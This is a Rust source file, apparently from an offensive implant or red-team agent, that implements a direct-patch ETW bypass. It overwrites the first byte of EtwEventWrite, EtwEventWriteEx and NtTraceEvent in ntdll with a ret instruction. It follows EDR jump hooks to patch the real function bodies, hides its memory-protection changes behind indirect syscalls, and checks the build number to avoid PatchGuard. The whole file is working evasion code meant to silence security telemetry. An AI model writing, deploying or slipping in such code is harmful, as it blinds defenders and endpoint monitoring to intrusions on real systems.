//! Direct-patch ETW bypass: overwrites the first byte of `EtwEventWrite`,
//! `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll with a `ret` (0xC3)
//! instruction, causing all ETW event reporting to return immediately.
//!
//! # Motivation
//! The HWBP-based bypass in `evasion.rs` consumes debug registers (Dr0–Dr3)
//! and can be detected by EDRs that inspect register state.  This module
//! provides a complementary approach that:
//!
//! - Does not use debug registers (no Dr0–Dr3 exhaustion).
//! - Has no runtime overhead (no exception handling path).
//! - Cannot be detected by checking debug register state.
//! - Patches three distinct ETW entry points for defense-in-depth.
//!
//! # Interaction with EDR hooks
//! If an EDR has placed a 32-bit relative `jmp` (0xE9) at the function entry,
//! the implementation follows the jump to locate the real function body and
//! patches that instead, so the bypass takes effect even when a hook is present.
//!
//! # Safety
//! All exported functions are `unsafe`.  They perform raw memory writes to
//! executable pages and must only be called on Windows x86-64.  On all other
//! platforms the functions are no-ops.
//!
//! No OS handles are opened: ntdll is located by walking the PEB loader list
//! and memory protection changes are performed via NtProtectVirtualMemory
//! indirect syscall (no kernel32 IAT entries).

#[cfg(windows)]
use std::sync::atomic::AtomicU8;

/// Saved original first byte of `EtwEventWrite` (0 = never patched).
#[cfg(windows)]
static ORIG_ETW_WRITE: AtomicU8 = AtomicU8::new(0);
/// Saved original first byte of `EtwEventWriteEx` (0 = never patched).
#[cfg(windows)]
static ORIG_ETW_WRITE_EX: AtomicU8 = AtomicU8::new(0);
/// Saved original first byte of `NtTraceEvent` (0 = never patched).
#[cfg(windows)]
static ORIG_NT_TRACE: AtomicU8 = AtomicU8::new(0);

// ── Windows implementation ────────────────────────────────────────────────────

#[cfg(windows)]
mod imp {
    use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
    use std::sync::atomic::Ordering;
    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

    /// Change memory protection using NtProtectVirtualMemory via indirect
    /// syscall (avoids kernel32!VirtualProtect IAT entry).  Falls back to
    /// VirtualProtect when the `direct-syscalls` feature is disabled.
    ///
    /// Parameters mirror VirtualProtect for call-site convenience.
    #[inline]
    unsafe fn change_protect(
        addr: *mut std::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: &mut u32,
    ) -> bool {
        #[cfg(feature = "direct-syscalls")]
        {
            let mut base_addr = addr;
            let mut region_size = size;
            let status = crate::syscalls::syscall_NtProtectVirtualMemory(
                (-1isize) as usize as u64,              // NtCurrentProcess()
                &mut base_addr as *mut _ as usize as u64, // PVOID*  (in/out)
                &mut region_size as *mut _ as usize as u64, // PSIZE_T (in/out)
                new_protect as u64,
                old_protect as *mut _ as usize as u64,     // PULONG  (out)
            );
            status == 0 // NTSTATUS_SUCCESS
        }
        #[cfg(not(feature = "direct-syscalls"))]
        {
            winapi::um::memoryapi::VirtualProtect(addr, size, new_protect, old_protect) != 0
        }
    }

    /// Maximum number of hook chain levels to follow before giving up.
    const MAX_HOOK_CHAIN_DEPTH: usize = 4;

    /// Resolve the real patchable address for a function, following any
    /// 32-bit relative `jmp` (0xE9) or RIP-relative indirect `jmp`
    /// (0xFF 0x25) that an EDR may have placed at the entry.  Chains of
    /// up to [`MAX_HOOK_CHAIN_DEPTH`] levels are followed; deeper chains
    /// (or circular references from a malicious hook table) are rejected
    /// and the last valid address is returned.
    unsafe fn resolve_target(func_addr: usize) -> usize {
        if func_addr == 0 {
            return 0;
        }
        let mut addr = func_addr;
        for _ in 0..MAX_HOOK_CHAIN_DEPTH {
            let first = *(addr as *const u8);
            if first == 0xE9 {
                // Near relative jmp: destination = addr + 5 + rel32
                let rel = *(addr.wrapping_add(1) as *const i32) as isize;
                let dest = (addr as isize).wrapping_add(5).wrapping_add(rel) as usize;
                if dest == 0 {
                    break;
                }
                addr = dest;
            } else if first == 0xFF && *(addr.wrapping_add(1) as *const u8) == 0x25 {
                // RIP-relative indirect jmp: slot = addr + 6 + disp32
                // absolute target = *slot (8-byte pointer)
                let disp = *(addr.wrapping_add(2) as *const i32) as isize;
                let slot = (addr as isize).wrapping_add(6).wrapping_add(disp) as usize;
                if slot == 0 {
                    break;
                }
                let dest = *(slot as *const usize);
                if dest == 0 {
                    break;
                }
                addr = dest;
            } else {
                // No further hook — addr is the real function body.
                break;
            }
        }
        addr
    }

    /// Attempt to patch a single function entry point with `ret` (0xC3).
    ///
    /// Returns `true` if the patch was applied or the function was already
    /// patched; `false` if any step failed (e.g. `VirtualProtect` rejected
    /// by CFG).
    pub unsafe fn patch_one(func_addr: usize, orig: &std::sync::atomic::AtomicU8) -> bool {
        let target = resolve_target(func_addr);
        if target == 0 {
            return false;
        }

        let first_byte = *(target as *const u8);

        // Already patched by us or something else — record and skip.
        if first_byte == 0xC3 {
            orig.store(0xC3, Ordering::Relaxed);
            return true;
        }

        // Save the original byte before overwriting.
        orig.store(first_byte, Ordering::Relaxed);

        let mut old_protect: u32 = 0;
        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
            return false;
        }

        // Atomically visible write of the ret instruction.
        core::ptr::write_volatile(target as *mut u8, 0xC3u8);

        // Restore original protection.  Failure here is non-fatal: the patch
        // is already in place.
        let mut dummy: u32 = 0;
        change_protect(target as *mut _, 1, old_protect, &mut dummy);

        true
    }

    /// Restore a single patched function to its original first byte.
    pub unsafe fn unpatch_one(func_addr: usize, orig: &std::sync::atomic::AtomicU8) -> bool {
        let target = resolve_target(func_addr);
        if target == 0 {
            return false;
        }

        let original = orig.load(Ordering::Relaxed);
        // 0 means we never patched this function (all real ntdll exports start
        // with a non-zero opcode such as 0x4C for `mov r10, rcx`).
        if original == 0 {
            return false;
        }

        let mut old_protect: u32 = 0;
        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
            return false;
        }

        core::ptr::write_volatile(target as *mut u8, original);

        let mut dummy: u32 = 0;
        change_protect(target as *mut _, 1, old_protect, &mut dummy);

        true
    }

    /// Apply the direct-patch ETW bypass.
    ///
    /// Returns `true` if at least one function was successfully patched.
    pub unsafe fn patch_etw() -> bool {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return false,
        };

        let mut patched_any = false;

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE)
        {
            if patch_one(addr, &ORIG_ETW_WRITE) {
                patched_any = true;
            }
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITEEX)
        {
            if patch_one(addr, &ORIG_ETW_WRITE_EX) {
                patched_any = true;
            }
        }

        // NtTraceEvent is the kernel-mode ETW sink.  Patching it provides
        // defense-in-depth: even if userland functions are re-hooked by an EDR
        // after our initial patch, the kernel path remains silenced.
        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTTRACEEVENT)
        {
            if patch_one(addr, &ORIG_NT_TRACE) {
                patched_any = true;
            }
        }

        patched_any
    }

    /// Restore all patched ETW functions to their original first bytes.
    pub unsafe fn unpatch_etw() {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return,
        };

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE)
        {
            unpatch_one(addr, &ORIG_ETW_WRITE);
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITEEX)
        {
            unpatch_one(addr, &ORIG_ETW_WRITE_EX);
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTTRACEEVENT)
        {
            unpatch_one(addr, &ORIG_NT_TRACE);
        }
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

// Windows build at or above which PatchGuard is known to monitor ETW patches.
// Windows 11 version 24H2 = build 26100.
#[cfg(windows)]
const PATCHGUARD_ETW_BUILD_THRESHOLD: u32 = 26100;

/// Read the Windows build number from the PEB without calling any Win32 API.
///
/// On x86-64 Windows the PEB is at `gs:[0x60]`.  The relevant offsets are:
///   * `+0x118` — `OSMajorVersion` (ULONG)
///   * `+0x11C` — `OSMinorVersion` (ULONG)
///   * `+0x120` — `OSBuildNumber`  (USHORT)
///
/// Returns `None` if the PEB pointer is null or the reads fail.
#[cfg(windows)]
unsafe fn peb_build_number() -> Option<u32> {
    let peb: *const u8;
    // SAFETY: reads a thread-local selector register; no memory is written.
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));

    // On aarch64 Windows the TEB is accessed via the system register
    // TPIDR_EL0.  The PEB pointer is stored at TEB+0x60 (same offset as
    // the x86_64 gs:[0x60] slot).  The kernel guarantees that TPIDR_EL0
    // always points to the current thread's TEB.
    #[cfg(target_arch = "aarch64")]
    {
        let teb: *const u8;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, preserves_flags));
        if teb.is_null() {
            return None;
        }
        peb = *(teb.add(0x60) as *const *const u8);
    }

    if peb.is_null() {
        return None;
    }
    // PEB.OSBuildNumber is a USHORT at offset 0x120.
    let build = *(peb.add(0x120) as *const u16) as u32;
    // A build of 0 indicates the field was not populated (pre-Vista PEB layout).
    if build == 0 { None } else { Some(build) }
}

/// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` according to
/// `mode` and the current Windows build number.
///
/// | `mode`   | build < 26100        | build >= 26100                |
/// |----------|----------------------|-------------------------------|
/// | `safe`   | patch applied        | skipped (PatchGuard risk)     |
/// | `always` | patch applied        | patch applied (testing only)  |
/// | `never`  | skipped              | skipped                       |
///
/// On non-Windows targets this is a no-op.
///
/// # Safety
///
/// Modifies executable code in the running process.  Must only be called once,
/// on Windows x86-64, before ETW-instrumented code executes.
#[cfg(windows)]
pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) {
    use common::config::EtwPatchMode;

    match mode {
        EtwPatchMode::Never => {
            log::debug!("etw_patch: mode=never; ETW patch skipped");
            return;
        }
        EtwPatchMode::Safe => {
            // SAFETY: PEB read only; no memory modification here.
            if let Some(build) = peb_build_number() {
                if build >= PATCHGUARD_ETW_BUILD_THRESHOLD {
                    log::warn!(
                        "etw_patch: Windows build {} >= {} (Win 11 24H2+); \
                         ETW direct-patch skipped in safe mode to avoid PatchGuard BSOD. \
                         Set malleable_profile.etw_patch_mode = 'always' to force patching \
                         in test environments where PatchGuard is disabled.",
                        build,
                        PATCHGUARD_ETW_BUILD_THRESHOLD,
                    );
                    return;
                }
                log::debug!("etw_patch: Windows build {} < {}; applying ETW patch", build, PATCHGUARD_ETW_BUILD_THRESHOLD);
            } else {
                // Could not read the PEB build number — proceed conservatively
                // (apply the patch; this mirrors pre-check behaviour).
                log::debug!("etw_patch: could not read PEB OSBuildNumber; applying ETW patch");
            }
        }
        EtwPatchMode::Always => {
            log::debug!("etw_patch: mode=always; applying ETW patch regardless of build number");
        }
    }

    let patched = imp::patch_etw();
    if patched {
        log::debug!("etw_patch: ETW functions patched successfully");
    } else {
        log::warn!("etw_patch: patch_etw returned false; no functions were patched");
    }
}

#[cfg(not(windows))]
pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) {}

/// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
/// by overwriting their first byte with `ret` (0xC3), suppressing ETW telemetry.
///
/// This is a complement to the HWBP bypass in `evasion::setup_hardware_breakpoints`:
/// it consumes no debug register slots and has zero exception-handler overhead.
///
/// On non-Windows targets this is a no-op.
///
/// # Safety
///
/// Modifies executable code in the running process.  Must only be called once,
/// on Windows x86-64, before ETW-instrumented code executes.
#[cfg(windows)]
pub unsafe fn patch_etw() {
    // Default to `safe` mode when called without an explicit mode.
    patch_etw_with_mode(common::config::EtwPatchMode::Safe);
}

#[cfg(not(windows))]
pub unsafe fn patch_etw() {}

/// Restore `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` to their
/// original first bytes, undoing the direct-patch bypass.
///
/// Must only be called after [`patch_etw`] has been invoked.
/// On non-Windows targets this is a no-op.
///
/// # Safety
///
/// Same requirements as [`patch_etw`].
#[cfg(windows)]
pub unsafe fn unpatch_etw() {
    imp::unpatch_etw();
}

#[cfg(not(windows))]
pub unsafe fn unpatch_etw() {}
